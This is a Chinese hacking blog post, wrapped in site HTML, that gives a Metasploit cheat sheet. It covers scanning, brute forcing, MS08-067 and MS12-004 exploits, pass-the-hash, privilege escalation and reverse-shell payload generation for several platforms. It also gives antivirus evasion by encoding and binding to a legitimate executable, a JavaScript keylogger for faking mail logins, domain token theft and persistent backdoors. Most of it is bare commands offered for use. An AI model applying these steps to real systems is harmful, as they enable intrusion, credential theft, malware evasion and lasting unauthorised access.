@@ -1,0 +1,439 @@
+<!doctype html>
+<html>
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable"  content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no">
+    
+    
+    <!--Simple SEO-->
+
+<meta name="description" content=发了特里投入到法国！/>
+
+
+<meta name="robots" content=all />
+<meta name="google" content=all />
+<meta name="googlebot" content=all />
+<meta name="verify" content=all />
+    <!--Title-->
+
+<title>Metasploit常用模块 | Parker&#39;s Blog |信息安全与管理</title>
+
+<link rel="alternate" href="/atom.xml" title="Parker&#39;s Blog |信息安全与管理" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/css/pages/post.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/thirdParty/highlight/github.css">
+    <!--script-->
+
+
+
+<script src="http://cdn1.lncld.net/static/js/2.1.0/av-min.js"></script>
+<script>
+    var appId = "uFijq1grJ17m6g9mxXustFdl-gzGzoHsz";
+    var appKey = "LbAV7dXpr848HV6uFeNK87CI";
+    var region = 'null';
+    AV.init({
+        appId: appId,
+        appKey: appKey,
+        region: region
+    });
+</script>
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+    
+    
+</head>
+
+<body>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<style>
+    header{ top: 71px; position: absolute!important;}
+    #container{padding-top: 151px!important;}
+</style>
+<div style="position:fixed;z-index:9999;left:0;top:0;width:100%;height:70px;background-color:#e0e0e0;color:#396CA5;border-bottom:1px solid #cecece;text-align:center;line-height:70px;white-space: nowrap;overflow: hidden;text-overflow: ellipsis">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+
+<div id="wrap">
+    <header  style="position: absolute;" >
+    <div id="site-meta">
+        <a href="/" id="logo">
+            <h1 class="title">Parker&#39;s Blog |信息安全与管理</h1>
+        </a>
+        
+        <h2 class="subtitle">正处于大学的花季少年的博客专栏，永不停歇！</h2>
+        
+    </div>
+    <ul id="nav">
+        
+            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+        
+            <li><a href="/atom.xml"><i class="fa fa-rss"></i>RSS</a></li>
+        
+        <li id="search"><a href="javascript:void(0)"><i class="fa fa-search"></i>搜索</a></li>
+    </ul>
+</header>
+
+    <div id="container">
+        
+<ul id="sidebar">
+    
+    
+<li class="widget notification">
+    <i class="fa fa-bell-o"></i>
+    <div>
+        
+<p>信息安全与管理的一枚学渣</p>
+    </div>
+</li>
+
+    
+    
+<li class="widget widget-normal category">
+    <h3 class="fa fa-th widget-title">分类</h3>
+    <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Metasploit系列教程/"><i class="fa" aria-hidden="true">Metasploit系列教程</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/python开发/"><i class="fa" aria-hidden="true">python开发</i></a><span class="category-list-count">14</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/python开发/python入门/"><i class="fa" aria-hidden="true">python入门</i></a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/python开发/python安全/"><i class="fa" aria-hidden="true">python安全</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/python开发/python爬虫/"><i class="fa" aria-hidden="true">python爬虫</i></a><span class="category-list-count">8</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/web开发/"><i class="fa" aria-hidden="true">web开发</i></a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web开发/NodeJS/"><i class="fa" aria-hidden="true">NodeJS</i></a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/信息安全/"><i class="fa" aria-hidden="true">信息安全</i></a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/信息安全/asp安全/"><i class="fa" aria-hidden="true">asp安全</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/信息安全/burpsuite/"><i class="fa" aria-hidden="true">burpsuite</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/信息安全/sqlmap/"><i class="fa" aria-hidden="true">sqlmap</i></a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线渗透/"><i class="fa" aria-hidden="true">无线渗透</i></a><span class="category-list-count">33</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/无线渗透/WEP破解/"><i class="fa" aria-hidden="true">WEP破解</i></a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线渗透/WPA破解/"><i class="fa" aria-hidden="true">WPA破解</i></a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线渗透/WPS破解/"><i class="fa" aria-hidden="true">WPS破解</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线渗透/内网渗透/"><i class="fa" aria-hidden="true">内网渗透</i></a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线渗透/安卓渗透/"><i class="fa" aria-hidden="true">安卓渗透</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线渗透/干扰通讯/"><i class="fa" aria-hidden="true">干扰通讯</i></a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线渗透/报文处理/"><i class="fa" aria-hidden="true">报文处理</i></a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线渗透/机制突破/"><i class="fa" aria-hidden="true">机制突破</i></a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线渗透/权限提升/"><i class="fa" aria-hidden="true">权限提升</i></a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线渗透/环境初探/"><i class="fa" aria-hidden="true">环境初探</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线渗透/维持访问/"><i class="fa" aria-hidden="true">维持访问</i></a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link current" href="/categories/网络数据包分析实战/"><i class="fa" aria-hidden="true">网络数据包分析实战</i></a><span class="category-list-count">40</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/网络数据包分析实战/协议篇/"><i class="fa" aria-hidden="true">协议篇</i></a><span class="category-list-count">19</span></li><li class="category-list-item"><a class="category-list-link current" href="/categories/网络数据包分析实战/基础篇/"><i class="fa" aria-hidden="true">基础篇</i></a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/网络数据包分析实战/安全篇/"><i class="fa" aria-hidden="true">安全篇</i></a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/网络数据包分析实战/排错篇/"><i class="fa" aria-hidden="true">排错篇</i></a><span class="category-list-count">6</span></li></ul></li></ul>
+</li>
+
+
+    
+    
+<li class="widget widget-normal archive">
+  <h3 class="fa fa-archive widget-title">归档</h3>
+    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/"><i class="fa" aria-hidden="true">March 2017</i></a><span class="archive-list-count">68</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/"><i class="fa" aria-hidden="true">February 2017</i></a><span class="archive-list-count">33</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/"><i class="fa" aria-hidden="true">January 2017</i></a><span class="archive-list-count">2</span></li></ul>
+</li>
+
+
+    
+    
+<li class="widget widget-normal popular-posts" id="popular-posts">
+    <h3 class="fa fa-thermometer-3 widget-title">热门文章</h3>
+    <ul id="popular-content">
+        <li class="load-first"><i class="fa fa-spinner fa-pulse"></i></li>
+    </ul>
+</li>
+
+    
+    
+<li class="widget widget-normal tags">
+  <h3 class="fa fa-tags widget-title">标签云</h3>
+  <div class="tagcloud-content">
+    
+      <a href="/tags/跑包建议/" style="font-size: 0.14rem; color: #4682b4">跑包建议</a> <a href="/tags/无线/" style="font-size: 0.2rem; color: #3cb371">无线</a> <a href="/tags/Hirte/" style="font-size: 0.14rem; color: #4682b4">Hirte</a> <a href="/tags/macchanger/" style="font-size: 0.15rem; color: #448ca7">macchanger</a> <a href="/tags/WEP/" style="font-size: 0.18rem; color: #409f8c">WEP</a> <a href="/tags/wifite/" style="font-size: 0.15rem; color: #448ca7">wifite</a> <a href="/tags/aircrack-ng/" style="font-size: 0.15rem; color: #448ca7">aircrack-ng</a> <a href="/tags/cowpatty/" style="font-size: 0.14rem; color: #4682b4">cowpatty</a> <a href="/tags/WPA/" style="font-size: 0.19rem; color: #3ea97e">WPA</a> <a href="/tags/hashcat/" style="font-size: 0.14rem; color: #4682b4">hashcat</a> <a href="/tags/Gerix/" style="font-size: 0.14rem; color: #4682b4">Gerix</a> <a href="/tags/NodeJS/" style="font-size: 0.15rem; color: #448ca7">NodeJS</a> <a href="/tags/单线程/" style="font-size: 0.15rem; color: #448ca7">单线程</a> <a href="/tags/异步IO/" style="font-size: 0.15rem; color: #448ca7">异步IO</a> <a href="/tags/pyrit/" style="font-size: 0.14rem; color: #4682b4">pyrit</a> <a href="/tags/ewsa/" style="font-size: 0.14rem; color: #4682b4">ewsa</a> <a href="/tags/reaver/" style="font-size: 0.14rem; color: #4682b4">reaver</a> <a href="/tags/WPS/" style="font-size: 0.14rem; color: #4682b4">WPS</a> <a href="/tags/pixiewps/" style="font-size: 0.14rem; color: #4682b4">pixiewps</a> <a href="/tags/arpspoof/" style="font-size: 0.14rem; color: #4682b4">arpspoof</a> <a href="/tags/ettercap/" style="font-size: 0.15rem; color: #448ca7">ettercap</a> <a href="/tags/driftnet/" style="font-size: 0.14rem; color: #4682b4">driftnet</a> <a href="/tags/内网渗透/" style="font-size: 0.18rem; color: #409f8c">内网渗透</a> <a href="/tags/airolib-ng/" style="font-size: 0.14rem; color: #4682b4">airolib-ng</a> <a href="/tags/渗透/" style="font-size: 0.2rem; color: #3cb371">渗透</a> <a href="/tags/nmap/" style="font-size: 0.14rem; color: #4682b4">nmap</a> <a href="/tags/CDP/" style="font-size: 0.14rem; color: #4682b4">CDP</a> <a href="/tags/Yersinia/" style="font-size: 0.14rem; color: #4682b4">Yersinia</a> <a href="/tags/macof/" style="font-size: 0.14rem; color: #4682b4">macof</a> <a href="/tags/lanmitm/" style="font-size: 0.14rem; color: #4682b4">lanmitm</a> <a href="/tags/幻影PIN/" style="font-size: 0.14rem; color: #4682b4">幻影PIN</a> <a href="/tags/zanti/" style="font-size: 0.14rem; color: #4682b4">zanti</a> <a href="/tags/安卓渗透/" style="font-size: 0.14rem; color: #4682b4">安卓渗透</a> <a href="/tags/mdk3/" style="font-size: 0.16rem; color: #429699">mdk3</a> <a href="/tags/干扰通讯/" style="font-size: 0.18rem; color: #409f8c">干扰通讯</a> <a href="/tags/airdrop-ng/" style="font-size: 0.14rem; color: #4682b4">airdrop-ng</a> <a href="/tags/airdecap-ng/" style="font-size: 0.14rem; color: #4682b4">airdecap-ng</a> <a href="/tags/报文处理/" style="font-size: 0.18rem; color: #409f8c">报文处理</a> <a href="/tags/wireshark/" style="font-size: 0.14rem; color: #4682b4">wireshark</a> <a href="/tags/Cain/" style="font-size: 0.14rem; color: #4682b4">Cain</a> <a href="/tags/ivstool/" style="font-size: 0.14rem; color: #4682b4">ivstool</a> <a href="/tags/deauth/" style="font-size: 0.14rem; color: #4682b4">deauth</a> <a href="/tags/机制突破/" style="font-size: 0.15rem; color: #448ca7">机制突破</a> <a href="/tags/hydra/" style="font-size: 0.15rem; color: #448ca7">hydra</a> <a href="/tags/medusa/" style="font-size: 0.14rem; color: #4682b4">medusa</a> <a href="/tags/权限提升/" style="font-size: 0.16rem; color: #429699">权限提升</a> <a href="/tags/kismet/" style="font-size: 0.14rem; color: #4682b4">kismet</a> <a href="/tags/airodump-ng/" style="font-size: 0.14rem; color: #4682b4">airodump-ng</a> <a href="/tags/维持访问/" style="font-size: 0.14rem; color: #4682b4">维持访问</a>
+  </div>
+</li>
+
+    
+    
+<li class="widget widget-normal friends-link">
+    <h3 class="fa fa-globe widget-title">友链</h3><br/>
+
+    
+        <a href="http://geekaholiclin.github.io" class="fa" target="_blank">主题作者</a>
+
+    
+
+</li>
+
+    
+</ul>
+
+
+        <div id="main">
+    <article id="post">
+        <div id="post-header">
+
+            <h1 id="Metasploit常用模块">
+                
+                Metasploit常用模块
+                
+            </h1>
+            <div class="article-meta">
+    
+    
+    <span class="categories-meta fa-wrap">
+            <i class="fa fa-folder-open-o"></i>
+        <span>Metasploit系列教程</span>
+    </span>
+    
+    
+    <span class="fa-wrap">
+         <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            null
+            
+        </span>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta ">2017/03/28</span>
+    </span>
+    
+    <span  class=" fa-wrap">
+        <i class="fa fa-comment-o"></i>
+        <span id="comments-count" class="comments-meta disqus-comment-count ds-thread-count comments" data-disqus-url="https://517736522.github.io/2017/03/28/Metasploit常用模块/" data-thread-key="/2017/03/28/Metasploit常用模块/"
+           data-count-type="comments"></span>
+    </span>
+    
+    
+    <span class="fa-wrap">
+            <i class="fa fa-thermometer-three-quarters"></i>
+        <span class="hits hits-meta " data-leadcloud-title="Metasploit常用模块"
+              data-leadcloud-url="/2017/03/28/Metasploit常用模块/"><i class="fa fa-spinner fa-spin"></i></span>
+    </span>
+    
+    
+</div>
+
+            
+            
+        </div>
+        
+        <div id="post-body">
+            <p><img src="/2017/03/28/Metasploit常用模块/1.jpg" alt="1"><br><img src="/2017/03/28/Metasploit常用模块/2.jpg" alt="2">  </p>
+<p>##metasploit升级更新<br>msfconsole目录在/usr/share/metasploit-framework<br>运行msfupdate即可更新  </p>
+<p>##metasploit端口扫描<br>在msfconsole中可调用nmap -v -sV target<br>msf中的模块：auxiliary/scanner/portscan/syn<br><img src="/2017/03/28/Metasploit常用模块/3.jpg" alt="3"><br>auxiliary/scanner/portscan/tcp<br><img src="/2017/03/28/Metasploit常用模块/4.jpg" alt="4">  </p>
+<p>##SMB扫描获取系统信息<br>auxiliary/scanner/smb/smb_version<br><img src="/2017/03/28/Metasploit常用模块/5.jpg" alt="5">  </p>
+<p>##ssh,ftp服务识别<br>auxiliary/scanner/ssh/ssh_version<br><img src="/2017/03/28/Metasploit常用模块/6.jpg" alt="6"><br>auxiliary/scanner/ftp/ftp_version<br><img src="/2017/03/28/Metasploit常用模块/7.jpg" alt="7">  </p>
+<p>##密码嗅探<br>auxiliary/sniffer/psnuffle<br><img src="/2017/03/28/Metasploit常用模块/8.jpg" alt="8"><br>用ftp登录后<br><img src="/2017/03/28/Metasploit常用模块/9.jpg" alt="9">  </p>
+<p>##snmp扫描<br><img src="/2017/03/28/Metasploit常用模块/10.jpg" alt="10"><br>auxiliary/scanner/snmp/snmp_login<br>对一台host进行字符串爆破<br><img src="/2017/03/28/Metasploit常用模块/11.jpg" alt="11"><br>auxiliary/scanner/snmp/snmp_enum<br>对多台host进行单一字符串的枚举<br><img src="/2017/03/28/Metasploit常用模块/12.jpg" alt="12">  </p>
+<p>##SMB登录验证<br>auxiliary/scanner/smb/smb_login<br>对445SMB服务进行枚举破解<br><img src="/2017/03/28/Metasploit常用模块/13.jpg" alt="13">  </p>
+<p>##VNC身份验证  </p>
+<p>auxiliary/scanner/vnc/vnc_none_auth<br>枚举主机，爆出版本<br><img src="/2017/03/28/Metasploit常用模块/14.jpg" alt="14">  </p>
+<p>##WMAP web扫描<br>先是启用数据库postgreSQL<br><img src="/2017/03/28/Metasploit常用模块/15.jpg" alt="15"><br>再启用msf,会连接数据库  </p>
+<p>读取wmap<br><img src="/2017/03/28/Metasploit常用模块/16.jpg" alt="16"><br>添加url<br>wmap_sites -a <a href="http://www.0day.co" target="_blank" rel="external">http://www.0day.co</a><br>查看列表<br>wmap_sites -l<br>将出现的ip地址记住用于添加目标<br>wmap_targets -t <a href="http://210.209.122.31" target="_blank" rel="external">http://210.209.122.31</a><br>查看<br>wmap_targets -l<br>加载扫描模块<br>wmap_run -t  </p>
+<p><img src="/2017/03/28/Metasploit常用模块/17.jpg" alt="17"><br>会扫描到web的常有漏洞<br>开始扫描<br><img src="/2017/03/28/Metasploit常用模块/18.jpg" alt="18"><br>扫描完成后查看结果<br>wmap_vulns -l<br>vulns<br>发现的目录，注入漏洞等···  </p>
+<p>##远程代码执行<br>利用的是ms08-067  exploit/windows/smb/ms08_067_netapi<br>payload为windows/meterpreter/reverse_tcp反弹连接<br>这个模块不会自动选择系统<br>所以需要自己指定<br>可用nmap -O 扫描出来  </p>
+<p>##MIDI文件解析远程代码执行<br>利用的是ms12-004 IE漏洞<br>exploit/windows/browser/ms12_004_midi<br><img src="/2017/03/28/Metasploit常用模块/19.jpg" alt="19"><br>低版本IP访问给出的连接时，会暂时无响应状态<br><img src="/2017/03/28/Metasploit常用模块/20.jpg" alt="20"><br>会自动化使用migrate转移进程寄生  </p>
+<p>##口令安全<br>mysql破解模块auxiliary/scanner/mysql/mysql_login<br>自备字典，设置RHOSTS,USERNAME,PASS_FILE,THREADS<br>即可枚举密码  </p>
+<p>ssh破解模块auxiliary/scanner/ssh/ssh_login<br>同样以上设置即可  </p>
+<p>ftp/ftp_login模块等等  </p>
+<p>#后渗透模块  </p>
+<p>##Hash值传递渗透   </p>
+<p>###知道密码的情况下：<br>先利用psexec模块渗透到一台HOSTexploit/windows/smb/psexec<br><img src="/2017/03/28/Metasploit常用模块/21.jpg" alt="21"><br>获取meterpreter后用hashdump命令获取hash  `<br><img src="/2017/03/28/Metasploit常用模块/22.jpg" alt="22">  </p>
+<p>###不知道密码的情况下但知道hash值使用hash值传递：<br><img src="/2017/03/28/Metasploit常用模块/23.jpg" alt="23">  </p>
+<p>##NDProxy内核提权<br>假如有一个权限比较小的主机，那么可用ms14002进行提权<br>exploit/windows/local/ms_ndproxy  </p>
+<p><img src="/2017/03/28/Metasploit常用模块/24.jpg" alt="24"><br>set session 1<br>exploit即可提权（这个是跟pdf有关）<br>也可以getsystem提权<br><img src="/2017/03/28/Metasploit常用模块/25.jpg" alt="25">  </p>
+<p>##多种后门生成<br>windows下的payload<br>msfpayload windows/meterpreter/reverse_tcp LHOST=xxxx LPORT=xxxx  X &gt;/root/1.exe<br>生成windows下的反弹的shell,X代表二进制<br>在目标运行之前需要启用监听器exploit/multi/handler<br>payload为刚刚的后门<br>目标执行后便可得到shell  </p>
+<p>linux下的payload<br>msfpayload linux/x86/shell_reverse_tcp LHOST=xxx LPORT=xxx X&gt;linux<br>设置监听器，目标运行需要读取的权限<br>chmod 777 linux<br>./linux  </p>
+<p>java下的payload<br>msfpayload java/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx W&gt;123.jar  </p>
+<p>php下的payload<br>msfpayload php/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx R | msfencode -e php/base64 -t raw -o 123.php  </p>
+<p>android下的payload<br>msfpayload android/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx R &gt;1.apk  </p>
+<p>##内网渗透<br>meterpreter&gt; run get_local_subnets获取目标网段<br>run autoroute -s 192.168.48.0/24使用该主机进行内网穿透<br>run autoroute -p 查看路由表  </p>
+<p>假设有域的存在且此主机为域的一员：<br>use incognito加载劫持工具<br>list_tokens -u 查看令牌<br>找到域管理员的令牌进行劫持<br>impersonate_token ADMIN-xxxxx\sss<br>成功后获得域管理员的shell了  </p>
+<p>可以利用嗅探模块auxiliary/sniffer/psnuffle<br>嗅探敏感信息<br><img src="/2017/03/28/Metasploit常用模块/26.jpg" alt="26">  </p>
+<p>##反反病毒（免杀）<br>msfpayload windows/shell/reverse_tcp LHOST=xxx LPORT=xxx R | msfencode -e x86/shikata_ga_nai -t exe &gt;123.exe<br>利用编码器进行免杀,免杀360了。。<br>msfencode -l 查看编码<br><img src="/2017/03/28/Metasploit常用模块/27.jpg" alt="27"><br>多次编码效果更佳<br>msfpayload windows/shell/reverse_tcp LHOST=xxx LPORT=xxx R | msfencode -e x86/shikata_ga_nai -c 10 -t raw | msfencode -e x86/countdown -c 5 -t exe -o /123.exe  </p>
+<p>绑定文件<br>msfpayload windows/shell/reverse_tcp LHOST=xxx LPORT=xxx R | msfencode  -t  exe -x /root/ftp.exe -o 123123.exe  -e x86/countdown -k -c 10<br>绑定ftp.exe并编码  </p>
+<p>upx加壳（加上去不好，容易报毒）<br>upx -5 /123.exe<br><img src="/2017/03/28/Metasploit常用模块/28.jpg" alt="28">  </p>
+<p>##玩转不一样的XSS<br>auxiliary/server/capture/http_javascript_keylogger<br><img src="/2017/03/28/Metasploit常用模块/29.jpg" alt="29"><br>set DEMO true<br>set URIPATH /<br>set srvport 80<br>run<br>访问之<br><img src="/2017/03/28/Metasploit常用模块/30.jpg" alt="30"><br><img src="/2017/03/28/Metasploit常用模块/31.jpg" alt="31"><br>可以伪造qq邮箱登录页面等等进行记录  </p>
+<p>##维持访问<br>在获得session后，留下后门的方式<br>meterpreter&gt;  run metsvc -A创建后门服务<br><img src="/2017/03/28/Metasploit常用模块/32.jpg" alt="32"><br>以后想连接时，应使用exploit/mulit/handler<br>使用的payload为windows/metsvc_bind_tcp<br><img src="/2017/03/28/Metasploit常用模块/33.jpg" alt="33"><br>LPORT 为上图的31337<br><img src="/2017/03/28/Metasploit常用模块/34.jpg" alt="34">  </p>
+<p>进行键盘记录也是留下后门的一种<br>meterpreter &gt; keyscan_start开始键盘监听<br>keyscan_dump显示键盘记录<br><img src="/2017/03/28/Metasploit常用模块/35.jpg" alt="35">  </p>
+
+        </div>
+        <div id="post-footer">
+            <div class="avatar" >
+                <img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1489313866302&di=e5bd5cd7aa8bb93d81236d05c3e0d433&imgtype=0&src=http%3A%2F%2Fbcs.img.r1.91.com%2Fdata%2Fupload%2F2014%2F11_06%2F17%2F201411061748054283.png" alt="avatar"/>
+                
+                <a href="javascript:void(0)" class="high-song">high起来 &#128541;</a>
+                
+                
+                <a href="javascript:void(0)" class="donate fa">赠我一杯 &#128536;</a>
+                
+            </div>
+            <ul class="author-profile-section">
+                <li>作者:
+                    
+                    <a href="/about.html">Parker</a>
+                </li>
+                <li>发表日期: <span>2017-03-28  03:48:54</span></li>
+                
+                <li>最后编辑日期: <span>2017-03-29  11:59:21</span></li>
+                
+                <li class="post-category">
+                    文章分类:
+                    
+                    <a href="/categories/Metasploit系列教程/">Metasploit系列教程</a>
+                    
+                </li>
+                <li class="post-tags">
+                    文章标签:
+                    
+                </li>
+                
+                <li> 版权声明: <a href="https://creativecommons.org/licenses/by-nc-nd/3.0/" target="_blank">
+知识共享署名-非商业性使用-禁止演绎 3.0 未本地化版本许可协议（CC BY-NC-ND 3.0）
+</a></li>
+                
+            </ul>
+            <div id="donate-wrap">
+                
+                
+                
+                <img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1489313866302&di=e5bd5cd7aa8bb93d81236d05c3e0d433&imgtype=0&src=http%3A%2F%2Fbcs.img.r1.91.com%2Fdata%2Fupload%2F2014%2F11_06%2F17%2F201411061748054283.png" alt="支付宝付款" class="donate-img">
+                
+                <img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1489313866302&di=e5bd5cd7aa8bb93d81236d05c3e0d433&imgtype=0&src=http%3A%2F%2Fbcs.img.r1.91.com%2Fdata%2Fupload%2F2014%2F11_06%2F17%2F201411061748054283.png" alt="微信付款" class="donate-img">
+                
+                
+            </div>
+        </div>
+    </article>
+    <div class="article-nav">
+        
+        <a href="/2017/03/28/E-mail数据包的解密/" class="pre-post fa fa-caret-left">E-mail数据包的解密</a>
+        
+        
+        <a href="/2017/03/28/TCP与UDP协议详解/" class="next-post fa">TCP与UDP协议详解</a>
+        
+    </div>
+    
+    <div id="comments">
+        
+
+<section id="duoshuo_comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="/2017/03/28/Metasploit常用模块/" data-title="Metasploit常用模块" data-url="https://517736522.github.io/2017/03/28/Metasploit常用模块/"></div>
+    <!-- 多说评论框 end -->
+    <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+    <script type="text/javascript">
+        var duoshuoQuery = {short_name:'517736522'};
+        (function() {
+            var ds = document.createElement('script');
+            ds.type = 'text/javascript';
+            ds.async = true;
+            ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            ds.charset = 'UTF-8';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds);
+        })();
+    </script>
+    <!-- 多说公共JS代码 end -->
+</section>
+
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+    <footer id="footer">
+    
+    <div class="social">
+        
+        <a href="https://www.example1.com" class="fa fa-free-code-camp" target="_blank" title="freecodecamp"></a>
+        
+        <a href="https://www.example2.com" class="fa fa-github" target="_blank" title="Follow me~"></a>
+        
+    </div>
+    
+    <div>
+        
+        <a href="/" class="copyright-links">Parker</a>&copy;2015 - 2017.All Rights
+        Reserved.
+    </div>
+    <p>Powered by <a href="https://hexo.io" class="copyright-links" target="_blank">Hexo</a> | Theme by <a
+                href="https://github.com/GeekaholicLin" class="copyright-links" target="_blank">GeekaholicLin</a>
+    </p>
+    
+    
+    <p>
+        <span id="busuanzi_container_site_pv" class="fa fa-bar-chart">
+        欢迎第<span id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></span>位小伙伴~
+        </span>
+    </p>
+    
+</footer>
+
+</div>
+    <ul id="tools">
+    <li class="totop-btn fa fa-angle-up"></li>
+    
+    <li class="toc-btn fa fa-list-ul"></li>
+    
+    
+
+    
+    <li class="comment-btn fa fa-comments-o">
+        <a href="#comments" title="comments"></a>
+    </li>
+    
+</ul>
+<p id="process"></p>
+<div id="search-overlay">
+    <div class="search-area-wrap">
+        <div id="search-area">
+            <div class="input-wrap focus">
+                <i class="fa fa-search" aria-hidden="true"></i>
+                <input id="search-input" autofocus autocomplete="off" type="text"
+                       placeholder="search this website..."/>
+            </div>
+            <ul id="search-result">
+                <li class="load-first"><i class="fa fa-spinner fa-spin"></i></li>
+            </ul>
+        </div>
+    </div>
+</div>
+
+    
+
+
+    <script src="/js/highsong.js"></script>
+
+
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+    //theme config datas
+    var copyrightObj = {};
+    copyrightObj.enable = 'true';
+    copyrightObj.triggerCopyLength = '200';
+    copyrightObj.appendText = '欢迎转载 © Parker';
+    var leancloudObj = {};
+    leancloudObj.enable = 'true';
+    leancloudObj.className = 'BlogCounter';
+    leancloudObj.limits = '10';
+</script>
+<script type="text/javascript">
+    var search = {};
+    var search_path = "search.xml";
+    if (!search_path) {
+        search_path = "search.xml";
+    }
+    search.path = "/" + search_path;
+    search.func =  _ajax.init();
+</script>
+<script src="/js/app.js"></script>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?260f22cfac85b1bf261e9e152a9ac8f8";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+</body>
+</html>
